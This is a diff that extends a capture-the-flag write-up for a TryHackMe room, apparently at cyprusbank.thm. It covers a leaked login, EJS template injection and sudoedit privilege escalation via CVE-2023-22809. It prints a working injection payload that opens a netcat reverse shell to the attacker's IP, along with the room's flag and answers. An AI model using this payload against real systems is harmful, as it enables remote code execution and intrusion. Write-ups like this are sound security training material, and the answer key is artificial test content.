@@ -30,7 +30,24 @@ and this is the URL of the chat: `http://admin.cyprusbank.thm/messages/?c=5`, by
 ![image](https://github.com/user-attachments/assets/0595a1d7-82ba-4396-a24d-95a08d3870d6)<br />
 So the `c` parameters stands for the number of chat messages that I can view. And here's what I found: <br />
 ![image](https://github.com/user-attachments/assets/5310d82f-f08e-4a39-9c9c-ae2787f1d859)<br />
-`Gayle Bev:p~]P@5!6;rs558:q`. So now I can log with his account, and can view people's phone numbers! (Tyrell Wellick's phone number is at the end of the write up).
+`Gayle Bev:p~]P@5!6;rs558:q`. So now I can log with his account, and can view people's phone numbers! (Tyrell Wellick's phone number is at the end of the write up).<br />
+Now I can access the settings panel, which seems that it's used to change user's passwords:<br />
+![image](https://github.com/user-attachments/assets/f2a34993-b381-4134-9fe3-92325f196536)<br />
+I checked if the passwords really changed, but they don't so I probably need to focus on some SSTI vulnerability? After enumerating the request for about 1 hour, I found out that removing the password parameter results in an error:<br />
+![image](https://github.com/user-attachments/assets/5c877073-1ce4-4b83-8ca8-c854e82cd548)<br />
+This suggests that the server is running EJS(Embedded JavaScript). So I searched online for some EJS SSTI and found [this one](https://github.com/mde/ejs/issues/720). So the password parameter that worked for me is `&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('busybox nc 10.11.108.100 4444 -e sh');s`, and the final payload request looks like this:<br />
+![image](https://github.com/user-attachments/assets/84e647ec-ab70-44aa-a152-fb2b8772a051)<br />
+This got me the user flag. <br />
+Running `sudo -l` I get this:<br />
+![image](https://github.com/user-attachments/assets/422e621a-990b-4748-8e41-d6177d64b9fc)<br />
+So I searched online how to exploit sudo on `sudoedit`, and found [this](https://github.com/n3m1sys/CVE-2023-22809-sudoedit-privesc) exploit. <br />
+![image](https://github.com/user-attachments/assets/c5aa4abd-800b-4b5a-8ea4-874acfae5ac4)<br />
+Let's check if my sudo is vulnerable:<br />
+![image](https://github.com/user-attachments/assets/aa2b3866-33bd-457e-9351-9af16cd6ac63)<br />
+It is! Let's run the exploit:<br />
+
+
+
 
 
 
@@ -38,5 +55,5 @@ So the `c` parameters stands for the number of chat messages that I can view. An
 
 
 - What's Tyrell Wellick's phone number? `842-029-5701`
-- What is the user.txt flag?
+- What is the user.txt flag? `THM{4lways_upd4te_uR_d3p3nd3nc!3s}`
 - What is the root.txt flag?
